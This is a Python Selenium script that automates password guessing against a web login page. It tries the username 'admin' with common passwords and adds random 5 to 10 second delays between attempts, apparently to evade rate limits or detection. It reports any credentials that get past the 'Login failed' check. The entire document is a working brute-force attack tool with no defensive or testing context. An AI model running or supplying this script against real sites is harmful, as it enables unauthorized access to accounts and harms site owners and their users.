from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import random

# Target URL
url = 'http://example.com/login'

# List of possible usernames and passwords
usernames = ['admin']
passwords = ['password', '123456', 'admin123']

# Initialize Selenium WebDriver
driver = webdriver.Chrome()

for username in usernames:
    for password in passwords:
        driver.get(url)
        
        # Find username and password fields and submit button
        username_field = driver.find_element_by_name('username')
        password_field = driver.find_element_by_name('password')
        submit_button = driver.find_element_by_name('submit')

        # Enter username and password
        username_field.send_keys(username)
        password_field.send_keys(password)
        
        # Simulate mouse click on submit button
        submit_button.click()
        
        # Introduce random delay between 5 to 10 seconds
        delay = random.uniform(5, 10)
        time.sleep(delay)

        # Check if login was successful (You need to modify this part according to the web response)
        if 'Login failed' not in driver.page_source:
            print(f'Successful login! Username: {username}, Password: {password}')
            break

# Close the browser
driver.quit()
